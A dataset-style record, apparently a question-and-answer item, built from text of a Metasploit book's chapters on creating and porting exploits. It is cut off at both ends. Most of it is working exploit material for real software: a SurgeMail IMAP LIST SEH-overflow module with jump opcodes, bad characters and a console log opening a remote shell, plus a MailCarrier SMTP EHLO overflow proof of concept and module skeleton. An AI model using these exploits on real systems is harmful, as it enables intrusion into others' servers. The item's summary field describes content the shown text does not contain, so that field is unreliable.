\"/FzwJjIcL16vW4PXDPpJbpsHB4p7Xts9fbaJYjRJASXRqbZnOMzprZfVZH7BYvcHuwlN0Yq\nyfoCrJyobzOqoscJeTeRgrDQKA8MDDLbmY6WCQ6XQH9Wkj4c9JCfPjIqTndsocWBz1xLMX1VdsutJEtnceHvhl\nGqee6Djh7v3oJW4tXJMMxe8uR2NgBlKoCbH18VTR8GUFqWCmQ0970B3gR9foi6inKdWdcE6ivbOHElAiYkFYzZ\n06Q5dvza58DVhn8sqSnRAmq1UlcUGuvr6r99POlrZst10r606J2B03TBGDFuy0dNMI0EUANKZ6OnCn3Zk1JL65\n9MC8PZy0frCiPBqZ4xn0biAjFTH5LsCjIFuI5eZ9LsdXdek7iiOhEmW6D86mAtyg9S1a7RALrbRcLIHJpwMsEE\n5LS1wIV9aFPS6RQwI4DtF4bGSle1FCyf63hy3Vo8AKkId6yu5MfjwfUExandVeUldk8c5bhlyqoDp3UX2ClQPZ\nos0KpFoIcxmq8R0E3Ri54l5Yl3OPcN7U20Kb1CEAfbhxGFgh1oMzjJpuM7IbHMrZNjVADz6A0byzgiP2pXa7Zm\nOloV9u6Fwa0l6sR6oL0Png9MYNwTMXTUdiE7rOjuOmkdgglPTkZ3n4de1FEaLh8Xhf9SNSPZUX0M7gmUiyNYv6\nqti3Omy8qvjJOQui1IhUhf5fKOunKIcB5Zw7quznxV1GF2R5hXVTw1vlbMi5TQW68ZDFlD6q6BJ4S3oNrFCyXX\naQpAURyCoDGdjoxk1vrUPGusf3i4EIF2iqyyekWiQ7GuYcwMax3o0ZXB2djFh2dYEGyBSCHaFhpwUgamThinnM\nAsDFuEY9Hq9UOQSmZ6ySunifPFjCbDs4Zooquw0HPaVnbNVo97tfVBYSei9dWCUWwUAPVJVsTGoDNRVarOrg8q\nwbziv8aQaPZ7Y8r0SUiB1nNhlhl3UCVZpf8Gck0psjETf4ks356q0I3mLZkqCLkznVV4ayetVgaDm\" \"PWNED\"\n(cid:92) [*] Server crashed, no response\n[*] Auxiliary module execution completed\nmsf auxiliary(imap_fuzz) >\nIn this listing, the fuzzer connects and logs into the remote service at (cid:88)\nand generates a random string of text at (cid:89). At (cid:90) the malicious request is sent\nto the server, and the reply is received and displayed at (cid:91). If the server receives\nno reply, you receive the notification at (cid:92) that the server has crashed, which\nis your cue to check your debugger.\nIf you now check your debugger on the Windows target, you should see\nthat it has paused at the point of the crash, as shown in Figure 14-1. Looking\nat the crash, we can see that no memory addresses are overwritten and that,\nunfortunately, there’s nothing really exploitable at first glance. After further\ntinkering with increasing buffer lengths, you will find that by sending an\n200 Chapter 14\neven longer string of 11,000 bytes, you can overwrite the Structured Excep-\ntion Handler (SEH). Controlling the SEH makes the exploit more reliable,\nbecause it makes it more versatile. Similarly, the use of an application DLL\nfor a return address makes the exploit portable across different operating sys-\ntem versions.\nFigure 14-1: The debugger pauses at the point of the crash.\nTo send the 11,000-byte string, we make a small change in the fuzzer\ncode, as shown here:\nprint_status(\"Generating fuzzed data...\")\nfuzzed = \"A\" * 11000\nprint_status(\"Sending fuzzed data, buffer length = %d\" % fuzzed.length)\nreq = '0002 LIST () \"/' + fuzzed + '\" \"PWNED\"' + \"\\r\\n\"\nRather than using the random string of characters, this code modifica-\ntion sends a string of 11,000 As as part of the malicious request.\nControlling the Structured Exception Handler\nIf you restart the surgemail service, reattach the debugger to the process,\nand rerun the module, you should see the crash that fuzzing found in your\ndebugger. If you’re using the Immunity Debugger, you should be able to see\nthe contents of the SEH chain by selecting View(cid:23)SEH chain. Right-click the\nvalue, which should be 41414141, and select Follow address in stack to dis-\nplay the stack contents leading to the SEH overwrite in the lower-right pane\nshown in Figure 14-2.\nCreating Your Own Exploits 201\nFigure 14-2: The overwritten SEH entry\nNow that you know that you can control the SEH chain on the vulner-\nable surgemail process with an overly long buffer, it’s time to determine the\nexact length required to overwrite it on the target. As you will recall from\nour discussions of stand-alone exploit development, before you can use a\nreturn address, you first need to find out where, exactly, the overwrite\noccurs.\nWe can modify our fuzzer code to create a nonrepeating, random string\nof characters of a specific length, as shown next:\nprint_status(\"Generating fuzzed data...\")\nfuzzed = Rex::Text.pattern_create(11000)\nprint_status(\"Sending fuzzed data, buffer length = %d\" % fuzzed.length)\nreq = '0002 LIST () \"/' + fuzzed + '\" \"PWNED\"' + \"\\r\\n\"\nIn this listing, we use Rex::Text.pattern_create to generate the nonrepeat-\ning random string of characters with our fuzzer. Rerunning the fuzzer module\nnow shows that SEH was overwritten on the target with 684E3368, as shown\nin Figure 14-3.\nFigure 14-3: The SEH overwritten with random\ncharacters\n202 Chapter 14\nWith the SEH overwritten with our random set of characters, we can use\npattern_offset.rb in /opt/metasploit3/msf3/tools/ to determine exactly where the\noverwrite occurs by passing the characters of interest (684E3368) followed by\nthe length of the string that was sent to the target (11000), as shown here:\nroot@bt:~/.msf3/modules/auxiliary/fuzzers# /opt/metasploit3/msf3/tools/pattern_offset.rb\n684E3368 11000\n10360\nThe value 10360 means that the four bytes that overwrite SEH are 10361,\n10362, 10363, and 10364. We can now change the fuzzer code one last time\nto verify our findings:\nprint_status(\"Generating fuzzed data...\")\nfuzzed = \"\\x41\" * 10360 fuzzed << \"\\x42\" * 4 fuzzed << \"\\x43\" * 636\nprint_status(\"Sending fuzzed data, buffer length = %d\" % fuzzed.length)\nAs shown, the fuzzer will build the malicious request beginning with\n10,360 As (hexadecimal 41), followed by four Bs (hexadecimal 42) to over-\nwrite the SEH, and then 636 Cs (hexadecimal 43) as filler to keep the string\nlength constant at 11,000 bytes.\nRunning the fuzzer against the target again shows that the entire SEH\nchain is under your complete control, as shown in Figure 14-4.\nFigure 14-4: SEH fully controlled\nCreating Your Own Exploits 203\nHopping Around SEH Restrictions\nFollowing the SEH overwrite, there’s very little space for shellcode before the\nend of the stack. Normally, a POP-POP-RETN set of instructions would be used\nto reach the Next SEH (NSEH), followed by a short jump forward into the\nshellcode. We’ll overcome this limited space restriction by developing an\nexploit to use as much space as possible for our final payload. At this point,\nwe are done with the fuzzing process and we’ll move into developing an\nexploit for the vulnerability that we found.\nThis exploit would be a good candidate for an egg hunter, which is a small\nsegment of shellcode that searches memory for the main payload; however,\nwe’ll use a different tactic and overwrite SEH with the POP-POP-RETN instruc-\ntion pointer. Once that’s overwritten we’ll make a short jump backward that\nrequires very few instructions (rather than jumping forward). Next, we’ll use\nthe space gained in the short jump to execute the larger near jump farther\nback into a NOP slide and shellcode. Although it’s not required, a NOP slide\nis always a good addition to an exploit, because it gives you a little room for\nerror should the buffer position change in memory. NOPs will have no adverse\nimpact on the exploit code and will act as filler. Conceptually, the attack will\nlook like this:\n[Buffer of garbage | NOP Slide | Shellcode | Near Jump | Short Jump | POP-POP-RETN]\nTo ensure portability of the exploit across different versions of Windows,\nuse a return address from an application DLL or executable. In this case,\nonly the application executable itself is available, so you can try to accom-\nplish a three-byte overwrite of SEH using a POP-POP-RETN sequence of\ninstructions from the surgemail.exe file. If this can be done successfully, the\nexploit will be universal across versions of Windows.\nLet’s move on to creating the actual exploit for the SurgeMail vulnerability.\nFollowing is our initial skeleton exploit module to be saved in /root/.msf3/\nmodules/exploits/windows/imap/:\nrequire 'msf/core'\nclass Metasploit3 < Msf::Exploit::Remote\ninclude Msf::Exploit::Remote::Imap\ndef initialize(info = {})\nsuper(update_info(info,\n'Name' => 'Surgemail 3.8k4-4 IMAPD LIST Buffer Overflow',\n'Description' => %q{\nThis module exploits a stack overflow in the Surgemail IMAP Server\nversion 3.8k4-4 by sending an overly long LIST command. Valid IMAP\naccount credentials are required.\n},\n'Author' => [ 'ryujin' ],\n'License' => MSF_LICENSE,\n'Version' => '$Revision: 1 $',\n204 Chapter 14\n'References' =>\n[\n[ 'BID', '28260' ],\n[ 'CVE', '2008-1498' ],\n[ 'URL', 'http://www.exploit-db.com/exploits/5259' ],\n],\n'Privileged' => false,\n'DefaultOptions' =>\n{\n'EXITFUNC' => 'thread',\n},\n'Payload' =>\n{\n(cid:88)'Space' => 10351,\n'DisableNops' => true,\n'BadChars' => \"\\x00\"\n},\n'Platform' => 'win',\n'Targets' =>\n[\n(cid:89)[ 'Windows Universal', { 'Ret' => 0xDEADBEEF } ], # p/p/r TBD\n],\n'DisclosureDate' => 'March 13 2008',\n'DefaultTarget' => 0))\nend\ndef exploit\n(cid:90)connected = connect_login\n(cid:91)lead = \"\\x41\" * 10360\n(cid:92)evil = lead + \"\\x43\" * 4\nprint_status(\"Sending payload\")\n(cid:93)sploit = '0002 LIST () \"/' + evil + '\" \"PWNED\"' + \"\\r\\n\"\n(cid:94)sock.put(sploit)\nhandler\ndisconnect\nend\nend\nThe 'Space' declaration at (cid:88) refers to the space available for shellcode.\nThis declaration is very important in an exploit module because it deter-\nmines which payloads Metasploit will allow you to use when running your\nexploit. Some payloads require much more space than others, so try not to\noverstate this value. Payload sizes vary greatly and encoding increases their\nsizes. To see the size of an unencoded payload, you would use the info com-\nmand followed by the name of the payload and look for the Total size value,\nas shown here:\nmsf > info payload/windows/shell_bind_tcp\nName: Windows Command Shell, Bind TCP Inline\nModule: payload/windows/shell_bind_tcp\nVersion: 8642\nCreating Your Own Exploits 205\nPlatform: Windows\nArch: x86\nNeeds Admin: No\nTotal size: 341\nRank: Normal\nThe return address at (cid:89) in the 'Targets' section is currently occupied bya\nplaceholder value, which we’ll change later in the exploit development process.\nAs with the fuzzer module discussed earlier, this exploit connects and\nlogs into the target at (cid:90), uses a string of As at (cid:91) as the initial buffer, and\nappends four Cs at (cid:92) to overwrite the SEH. The entire exploit string is gen-\nerated at (cid:93) and then sent to the target at (cid:94).\nGetting a Return Address\nThe next step is to locate a POP-POP-RETN sequence in surgemail.exe. To do\nso, copy the executable to a location on your Back|Track machine, and then\nuse the -p switch with msfpescan to locate a suitable candidate, as in the follow-\ning example:\nroot@bt:/tmp# msfpescan -p surgemail.exe\n[surgemail.exe]\n0x0042e947 pop esi; pop ebp; ret\n0x0042f88b pop esi; pop ebp; ret\n0x00458e68 pop esi; pop ebp; ret\n0x00458edb pop esi; pop ebp; ret\n0x0046754d pop esi; pop ebp; ret\n0x00467578 pop esi; pop ebp; ret\n0x0046d204 pop eax; pop ebp; ret\n. . . SNIP . . .\n0x0078506e pop ebx; pop ebp; ret\n0x00785105 pop ecx; pop ebx; ret\n0x0078517e pop esi; pop ebx; ret\nWhen msfpescan is run against the target executable, it reads through\nthemachine code looking for assembly instructions that match the target (a\nPOP-POP-RETN sequence in this case) and displays the memory address where\nthese instructions occur. As you can see in the listing, multiple addresses are\nfound. We’ll use the address at the end of the output, 0x0078517e, to overwrite\nSEH in the exploit. Having made our selection, we edit the 'Targets' section\nof the exploit module to include this address and edit the exploit section to\ninclude it as part of the buffer to be sent, as shown next.\n206 Chapter 14\n'Platform' => 'win',\n'Targets' =>\n[\n(cid:88)[ 'Windows Universal', { 'Ret' => \"\\x7e\\x51\\x78\" } ], # p/p/r in surgemail.exe\n],\n'DisclosureDate' => 'March 13 2008',\n'DefaultTarget' => 0))\nend\ndef exploit\nconnected = connect_login\nlead = \"\\x41\" * 10360\n(cid:89)evil = lead + [target.ret].pack(\"A3\")\nprint_status(\"Sending payload\")\nsploit = '0002 LIST () \"/' + evil + '\" \"PWNED\"' + \"\\r\\n\"\nTo perform a three-byte overwrite of the SEH, we set the three bytes to be\nadded to the buffer in the 'Targets' block at (cid:88), in little-endian order, as shown\nin boldface type in the listing. (Endian-ness is determined by the target CPU’s\narchitecture, and Intel-compatible processors use little-endian byte ordering.)\nAt (cid:89) we replace the three Cs in the evil string with [target.ret].pack(\"A3\"),\nwhich will send the return address exactly as it is declared in the 'Targets'\nblock. When modifying many exploits that use a three-byte overwrite, you can\ndeclare the target address literally (0x0078517e in this case) and Metasploit\nwill automatically order the bytes correctly when you use [target.ret].pack('V').\nThis scenario requires more granular control, because if we were to send the\nnull (00) byte, it would represent the end of a string and could prevent the\nexploit from functioning properly.\nNow is a good time to run the exploit to make sure that it works prop-\nerly. If you jump too far ahead when developing an exploit, you run the risk\nof making an error somewhere and having to do a lot of backtracking to find\nout what went wrong. Here’s the exploit:\nmsf > use exploit/windows/imap/surgemail_book\nmsf exploit(surgemail_book) > set IMAPPASS test\nIMAPPASS => test\nmsf exploit(surgemail_book) > set IMAPUSER test\nIMAPUSER => test\nmsf exploit(surgemail_book) > set RHOST 192.168.1.155\nRHOST => 192.168.1.155\n(cid:88) msf exploit(surgemail_book) > set PAYLOAD generic/debug_trap\nPAYLOAD => generic/debug_trap\nmsf exploit(surgemail_book) > exploit\n[*] Authenticating as test with password test...\n[*] Sending payload\n[*] Exploit completed, but no session was created.\nmsf exploit(surgemail_book) >\nCreating Your Own Exploits 207\nThe payload that we use at (cid:88), generic/debug_trap, won’t actually send a\npayload. Instead, it sends multiple \\xCCs, or breakpoints, to debug the execu-\ntion flow of the exploit. This is useful for confirming that your shellcode is\ninserted at the right places in your exploit.\nAfter running the exploit, open the Immunity Debugger, as shown in\nFigure 14-5, and at the crash select View(cid:23)SEH chain. Set a breakpoint by\npressing F2, and then press SHIFT-F9 to pass the exception to the application\nand step into the POP-POP-RETN sequence of instructions.\nNow, still in the debugger, press F7 to single-step through the instructions\nuntil you land in the 41414141 contained in NSEH.\nFigure 14-5: Landing in the POP-POP-RETN instructions\nNext, edit the exploit to include the instructions for the short jump back-\nward, as shown here:\ndef exploit\nconnected = connect_login\n(cid:88)lead = \"\\x41\" * 10356\n(cid:89)nseh = \"\\xeb\\xf9\\x90\\x90\"\nevil = lead + nseh + [target.ret].pack(\"A3\")\nprint_status(\"Sending payload\")\nsploit = '0002 LIST () \"/' + evil + '\" \"PWNED\"' + \"\\r\\n\"\nsock.put(sploit)\nhandler\ndisconnect\nend\n208 Chapter 14\nWhen editing your exploit, be sure to adjust the initial buffer length at (cid:88)\nas you make changes, or your alignment will be off. In this case, NSEH is being\noverwritten with the instructions to make a short five-byte jump backward\n(\\xeb\\xf9\\x90\\x90) (cid:89), where eb is the operation code for a short jump. The\nnew lead buffer length is adjusted to 10,356 bytes, because these five new\nbytes come before the SEH overwrite.\nWhen you run the exploit again and step through the instructions in the\ndebugger, you should land in the 41s (hexadecimal As) before the exception\nhandler values. The five INC ECX instructions should be replaced with the\ncode to jump farther back into the initial buffer.\nNow we’ll change the exploit to include the “near jump” (\\xe9\\xdd\\xd7\\\nxff\\xff) sequence of instructions, to jump backward to a location near the\nbeginning of the buffer. Looking at the buffer (Figure 14-6), you can see that\nthe entire string of As is completely intact, leaving more than 10,000 bytes\navailable for shellcode. Since the average space required for functional\nshellcode is less than 500 bytes, this leaves you ample room.\nFigure 14-6: Lots of room for shellcode\nNow all you have to do is replace the buffer of 41s with NOPs (\\x90) to\ngive yourself a nice NOP slide to land in, and then you can sit back and let\nMetasploit take care of the shellcode.\ndef exploit\nconnected = connect_login\n(cid:88)lead = \"\\x90\" * (10351 - payload.encoded.length)\n(cid:89)near = \"\\xe9\\xdd\\xd7\\xff\\xff\"\nnseh = \"\\xeb\\xf9\\x90\\x90\"\nCreating Your Own Exploits 209\n(cid:90)evil = lead + payload.encoded + near + nseh + [target.ret].pack(\"A3\")\nprint_status(\"Sending payload\")\nsploit = '0002 LIST () \"/' + evil + '\" \"PWNED\"' + \"\\r\\n\"\nsock.put(sploit)\nhandler\ndisconnect\nend\nAs you can see in this listing, the initial string of As we used earlier is\nreplaced by NOPs minus the length of the shellcode that Metasploit generates\nat (cid:88). Notice that the buffer length, initially 10,356 bytes, has been decreased\nby five bytes to 10,351 to account for the near jump instructions at (cid:89). Finally,\nthe malicious string is built using all of the exploit’s components at (cid:90).\nNow we can select a real payload and execute the module to see what\nhappens. Surprisingly, the exploit completes but no session is created. The\nexploit module connects and sends its payload, but no shell is returned to us,\nas shown next:\nmsf exploit(surgemail_book) > set payload windows/shell_bind_tcp\npayload => windows/shell_bind_tcp\nmsf exploit(surgemail_book) > exploit\n[*] Started bind handler\n[*] Authenticating as test with password test...\n[*] Sending payload\n[*] Exploit completed, but no session was created.\nmsf exploit(surgemail_book) >\nBad Characters and Remote Code Execution\nWell, that certainly wasn’t expected: The exploit completes but no session\niscreated. If you check your debugger, you’ll see that the application didn’t\neven crash—so what happened? Welcome to the sometimes challenging and\nnearly always frustrating world of bad characters. Some characters, when sent\nas part of an exploit buffer, get mangled while being read by the application.\nThe unfortunate result is that bad characters render your shellcode, and\nsometimes the entire exploit, unusable.\nWhen writing a Metasploit module, you should always be sure to identify\nall the bad characters, because the shellcode that Metasploit generates differs\neach time an exploit is launched, and any rogue bad characters will greatly\nreduce a module’s reliability. In many cases, if you fail to find all the bad\ncharacters, the application will crash without running the shellcode. In the\npreceding example, SurgeMail didn’t even crash. The exploit appears to\nsucceed, but we don’t get a session.\nThere are many ways to identify bad characters, including replacing the\ndynamically created shellcode with a string of sequential characters (\\x00\\\nx01\\x02…), and checking the debugger to see where the first character gets\n210 Chapter 14\nmangled and marking that character as bad. One of the fastest methods,\nhowever, is to find the bad characters in the source code of similar exploits.\nFor example, a search of the IMAP exploits as of this writing finds \\x00\\x09\\\nx0a\\x0b\\x0c\\x0d\\x20\\x2c\\x3a\\x40\\x7b listed as bad characters, as shown next:\n'Privileged' => false,\n'DefaultOptions' =>\n{\n'EXITFUNC' => 'thread',\n},\n'Payload' =>\n{\n'Space' => 10351,\n'DisableNops' => true,\n'BadChars' => \"\\x00\\x09\\x0a\\x0b\\x0c\\x0d\\x20\\x2c\\x3a\\x40\\x7b\"\n},\n'Platform' => 'win',\n'Targets' =>\nWhen you declare 'BadChars' in an exploit module, Metasploit will auto-\nmatically exclude them from shellcode and from any automatically generated\nstrings of text or NOPs.\nWhen we run the exploit again, as shown next, after declaring bad char-\nacters, we finally get a session on the third try. The exploit still isn’t reliable,\nbut it works because Metasploit dynamically changes the shellcode each time\nthe exploit is run. As a result, the characters that are causing the module to\nfail may not always be present.\nmsf exploit(surgemail_book) > rexploit\n[*] Started bind handler\n[*] Authenticating as test with password test...\n[*] Sending payload\n[*] Exploit completed, but no session was created.\nmsf exploit(surgemail_book) > rexploit\n[*] Started bind handler\n[*] Authenticating as test with password test...\n[*] Sending payload\n[*] Exploit completed, but no session was created.\nmsf exploit(surgemail_book) > rexploit\n[*] Started bind handler\n[*] Authenticating as test with password test...\n[*] Sending payload\n[*] Command shell session 1 opened (192.168.1.101:59501 -> 192.168.1.155:4444)\n(C) Copyright 1985-2001 Microsoft Corp.\nc:\\surgemail>\nCreating Your Own Exploits 211\nDetermining the remaining bad characters is an exercise left for the\nreader. An excellent, albeit tedious, way to eliminate all bad characters is\ntofollow the technique described at http://en.wikibooks.org/wiki/Metasploit/\nWritingWindowsExploit#Dealing_with_badchars.\nThe current exploit code, including all of the pieces we’ve added, is\nshown here:\nrequire 'msf/core'\nclass Metasploit3 < Msf::Exploit::Remote\ninclude Msf::Exploit::Remote::Imap\ndef initialize(info = {})\nsuper(update_info(info,\n'Name' => 'Surgemail 3.8k4-4 IMAPD LIST Buffer Overflow',\n'Description' => %q{\nThis module exploits a stack overflow in the Surgemail IMAP Server\nversion 3.8k4-4 by sending an overly long LIST command. Valid IMAP\naccount credentials are required.\n},\n'Author' => [ 'ryujin' ],\n'License' => MSF_LICENSE,\n'Version' => '$Revision: 1 $',\n'References' =>\n[\n[ 'BID', '28260' ],\n[ 'CVE', '2008-1498' ],\n[ 'URL', 'http://www.exploit-db.com/exploits/5259' ],\n],\n'Privileged' => false,\n'DefaultOptions' =>\n{\n'EXITFUNC' => 'thread',\n},\n'Payload' =>\n{\n'Space' => 10351,\n'DisableNops' => true,\n'BadChars' => \"\\x00\\x09\\x0a\\x0b\\x0c\\x0d\\x20\\x2c\\x3a\\x40\\x7b\"\n},\n'Platform' => 'win',\n'Targets' =>\n[\n[ 'Windows Universal', { 'Ret' => \"\\x7e\\x51\\x78\" } ], # p/p/r in surgemail.exe\n],\n'DisclosureDate' => 'March 13 2008',\n'DefaultTarget' => 0))\nend\n212 Chapter 14"
  },
  {
    "input": "What is the process of porting a buffer overflow exploit to the Metasploit Framework and what are the key steps involved in modifying the original exploit code to work within the Framework?",
    "summary": "This chapter explains how to port buffer overflow and SEH overwrite exploits into the Metasploit Framework. It covers the process of modifying existing exploits, using assembly language techniques, and leveraging Metasploit's tools to create functional and versatile exploits. The examples demonstrate how to replace hardcoded values with dynamic ones, use randomization to avoid detection, and integrate the exploit into the framework for easier use and modification. The chapter also shows how to create a Meterpreter shell and highlights the importance of understanding the framework's capabilities for developing effective exploits.",
    "output": "def exploit\nconnected = connect_login\nlead = \"\\x90\" * (10351 - payload.encoded.length)\nnear = \"\\xe9\\xdd\\xd7\\xff\\xff\"\nnseh = \"\\xeb\\xf9\\x90\\x90\"\nevil = lead + payload.encoded + near + nseh + [target.ret].pack(\"A3\")\nprint_status(\"Sending payload\")\nsploit = '0002 LIST () \"/' + evil + '\" \"PWNED\"' + \"\\r\\n\"\nsock.put(sploit)\nhandler\ndisconnect\nend\nend\nWrapping Up\nAlthough we haven’t uncovered a new vulnerability in this chapter, we have\ncovered the entire process from developing and running a fuzzer to developing\na functioning exploit. The exploit that we built in this chapter is complicated\nand unusual, and it therefore offers an excellent opportunity to think beyond\nthe basics and explore creative avenues to obtain code execution.\nOne of the best ways to dig deeper into Metasploit is to read through the\nMetasploit source files and other exploit modules to get a better idea of what\nis possible within the Metasploit Framework. The techniques in this chapter\nhave given you the basic tools you’ll need to begin discovering vulnerabilities\nand developing Metasploit exploit modules that will take advantage of them.\nIn the next chapter we will begin to dive into porting exploits into the\nFramework that will build upon the knowledge you learned in this chapter.\nWe’ll show you how to convert publicly available exploits into a working\nMetasploit exploit by rewriting the exploit and debugging it to see what it’s\ndoing.\nCreating Your Own Exploits 213\nP O R T I N G E X P L O I T S T O T H E\nM E T A S P L O I T F R A M E W O R K\nYou can choose to convert exploits to Metasploit from\na different format for many reasons, not the least of\nwhich is to give back to the community and the Frame-\nwork. Not all exploits are based on the Metasploit Frame-\nwork; some are programmed in Perl and Python or C\nand C++.\nWhen you port exploits to Metasploit, you convert an existing stand-\nalone exploit, such as a Python or Perl script, for use within Metasploit. And,\nof course, after you have imported an exploit into the Framework, you can\nleverage the Framework’s many high-end tools to handle routine tasks, so\nthat you can concentrate on what is unique about your particular exploit. In\naddition, although stand-alone exploits often depend on your using a certain\npayload or operating system, once ported to the Framework, payloads can be\ncreated on the fly and the exploit can be used in multiple scenarios.\nThis chapter will walk you through the process of porting two stand-alone\nexploits to the Framework. With your knowledge of these basic concepts and\na bit of hard work on your part, you should be able to begin porting exploits\ninto the Framework yourself by the end of this chapter.\nAssembly Language Basics\nTo get the most out of this chapter, you’ll need a basic understanding of the\nassembly programming language. We use a lot of low-level assembly language\ninstructions and commands in this chapter, so let’s take a look at the most\ncommon ones.\nEIP and ESP Registers\nRegisters are placeholders that store information, perform calculations, or\nhold values that an application needs in order to run. The two most impor-\ntant registers for the purposes of this chapter are EIP, the extended instruc-\ntion pointer register, and ESP, the extended starter pointer register.\nThe value in EIP tells the application where to go after it has executed\nsome code. In this chapter, we’ll overwrite our EIP return address and tell it\nto point to our malicious shellcode. The ESP register is where, in our buffer\noverflow exploit, we would overwrite the normal application data with our\nmalicious code to cause a crash. The ESP register is essentially a memory\naddress and placeholder for our malicious shellcode.\nThe JMP Instruction Set\nThe JMP instruction set is the “jump” to the ESP memory address. In the over-\nflow example that we’ll explore in this chapter, we use the JMP ESP instruction\nset to tell the computer to go to the ESP memory address that happens to\ncontain our shellcode.\nNOPs and NOP Slides\nA NOP is a no-operation instruction. Sometimes when you trigger an over-\nflow, you won’t know exactly where you’re going to land within the space allo-\ncated. A NOP instruction simply says to the computer “Don’t do anything if\nyou see me,” and it is represented by a \\x90 in hexadecimal.\nA NOP slide is a handful of NOPs, combined to create a slide to our\nshellcode. When we go through and actually trigger the JMP ESP instructions,\nwe will hit a bunch of NOPs, which will slide down until we hit our shellcode.\nPorting a Buffer Overflow\nOur first example is a typical remote buffer overflow that needs only a jump\nto the extended stack pointer (JMP ESP) instruction to reach the shellcode.\nThis exploit, called the “MailCarrier 2.51 SMTP EHLO / HELO Buffer Over-\nflow Exploit,” uses MailCarrier 2.51 SMTP commands to cause a buffer\noverflow.\nNOTE You’ll find the exploit and a vulnerable application at http://www.exploit-db.com/\nexploits/598/.\n216 Chapter 15\nBut this is an older exploit, originally written for Windows 2000. When\nyou run it now, it doesn’t work quite as you’d expect. Conveniently, a Meta-\nsploit module is already in the Framework to implement this exploit, although\nit could use some improvement. After a little time investigating with varying\nbuffer lengths, you will find that more than 1000 bytes are available for\nshellcode, and the buffer length needs to be adjusted by 4 bytes. (For more\ninformation on how this is accomplished, read “Exploit Writing Tutorial\nPart 1: Stack Based Overflows,” at http://www.exploit-db.com/download_pdf/\n13535/.) The new proof of concept for this exploit follows: We have\nremoved the shellcode and replaced the jump instruction with a string\n(AAAA) to overwrite the EIP register. (Proof of concept exploits contain the\nbasic code necessary to demonstrate the exploit but do not carry an actual\npayload, and in many cases they require heavy modifications before they will\nwork properly.)\n#!/usr/bin/python\n#########################################################\n# MailCarrier 2.51 SMTP EHLO / HELO Buffer Overflow #\n# Advanced, secure and easy to use Mail Server. #\n# 23 Oct 2004 - muts #\n#########################################################\nimport struct\nimport socket\nprint \"\\n\\n###############################################\"\nprint \"\\nMailCarrier 2.51 SMTP EHLO / HELO Buffer Overflow\"\nprint \"\\nFound & coded by muts [at] whitehat.co.il\"\nprint \"\\nFor Educational Purposes Only!\\n\"\nprint \"\\n\\n###############################################\"\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nbuffer = \"\\x41\" * 5093\nbuffer += \"\\42\" * 4\nbuffer += \"\\x90\" * 32\nbuffer += \"\\xcc\" * 1000\ntry:\nprint \"\\nSending evil buffer...\"\ns.connect(('192.168.1.155',25))\ns.send('EHLO ' + buffer + '\\r\\n')\ndata = s.recv(1024)\ns.close()\nprint \"\\nDone!\"\nexcept:\nprint \"Could not connect to SMTP!\"\nAs you might imagine, the easiest and fastest way to port a stand-alone\nexploit to Metasploit is to modify a similar one from the Framework. And\nthat’s what we’ll do next.\nPorting Exploits to the Metasploit Framework 217\nStripping the Existing Exploit\nAs our first step in porting the MailCarrier exploit, we’ll strip down the exist-\ning Metasploit module to a simple skeleton file, as shown here:\nrequire 'msf/core'\nclass Metasploit3 < Msf::Exploit::Remote\nRank = GoodRanking\n(cid:88)include Msf::Exploit::Remote::Tcp\ndef initialize(info = {})\nsuper(update_info(info,\n'Name' => 'TABS MailCarrier v2.51 SMTP EHLO Overflow',\n'Description' => %q{\nThis module exploits the MailCarrier v2.51 suite SMTP service.\nThe stack is overwritten when sending an overly long EHLO command.\n},\n'Author' => [ 'Your Name' ],\n'Arch' => [ ARCH_X86 ],\n'License' => MSF_LICENSE,\n'Version' => '$Revision: 7724 $',\n'References' =>\n[\n[ 'CVE', '2004-1638' ],\n[ 'OSVDB', '11174' ],\n[ 'BID', '11535' ],\n[ 'URL', 'http://www.exploit-db.com/exploits/598' ],\n],\n'Privileged' => true,\n'DefaultOptions' =>\n{\n'EXITFUNC' => 'thread',\n},\n'Payload' =>\n{\n'Space' => 300,\n'BadChars' => \"\\x00\\x0a\\x0d\\x3a\",\n'StackAdjustment' => -3500,\n},\n'Platform' => ['win'],\n'Targets' =>\n[\n(cid:89)[ 'Windows XP SP2 - EN', { 'Ret' => 0xdeadbeef } ],\n],\n'DisclosureDate' => 'Oct 26 2004',\n'DefaultTarget' => 0))\nregister_options(\n[\n(cid:90)Opt::RPORT(25),\nOpt::LHOST(), # Required for stack offset\n218 Chapter 15\n], self.class)\nend\ndef exploit\nconnect\n(cid:91)sock.put(sploit + \"\\r\\n\")\nhandler\ndisconnect\nend\nend\nBecause this exploit does not require authentication, we need only the\nmixin Msf::Exploit::Remote::Tcp shown at (cid:88). We’ve discussed mixins in previ-\nous chapters; you’ll recall that mixins allow you to use built-in protocols such\nas Remote::Tcp to perform basic remote TCP communications.\nIn the preceding listing, the target return address is set to the bogus value\nOxdeadbeef at (cid:89), and the default TCP port is set to 25 at (cid:90). Upon connecting\nto the target, Metasploit will send the malicious attack using sock.put as shown\nat (cid:91) and craft our exploit for us.\nConfiguring the Exploit Definition\nLet’s look at how we initially configure our exploit definition. We will need\nto feed the service a greeting as required by the protocol, a large buffer, a\nplaceholder where we will take control of EIP, a brief NOP slide, and a place-\nholder for our shellcode. Here’s the code:\ndef exploit\nconnect\n(cid:88)sploit = \"EHLO \"\n(cid:89)sploit << \"\\x41\" * 5093\n(cid:90)sploit << \"\\x42\" * 4\n(cid:91)sploit << \"\\x90\" * 32\n(cid:92)sploit << \"\\xcc\" * 1000\nsock.put(sploit + \"\\r\\n\")\nhandler\ndisconnect\nend\nThe malicious buffer is built based on the original exploit code begin-\nning with the EHLO command at (cid:88) followed by a long string of As at (cid:89) (5093\nof them), 4 bytes to overwrite the EIP register at (cid:90), a small NOP slide at (cid:91),\nand then some dummy shellcode at (cid:92).\nPorting Exploits to the Metasploit Framework 219\nIn this case, we’ve selected an interrupt (breakpoint) at (cid:92) so that execution\nwill pause when it reaches our shellcode without us having to set a breakpoint.\nHaving configured the exploit section, we save the file as mailcarrier_book.rb\nat modules/exploits/windows/smtp/.\nTesting Our Base Exploit\nIn the next step, we load the module in msfconsole, set the required options,\nand configure a payload of generic/debug_trap (a great payload for exploit\ndevelopment that triggers a stop point when you are tracing the application\nin a debugger). Then we run the module:\nmsf > use exploit/windows/smtp/mailcarrier_book\nmsf exploit(mailcarrier_book) > show options\nModule options:\nName Current Setting Required Description\n---- --------------- -------- -----------\nLHOST yes The local address\nRHOST yes The target address\nRPORT 25 yes The target port\nExploit target:\nId Name\n-- ----\n0 Windows XP SP2 - EN\nmsf exploit(mailcarrier_book) > set LHOST 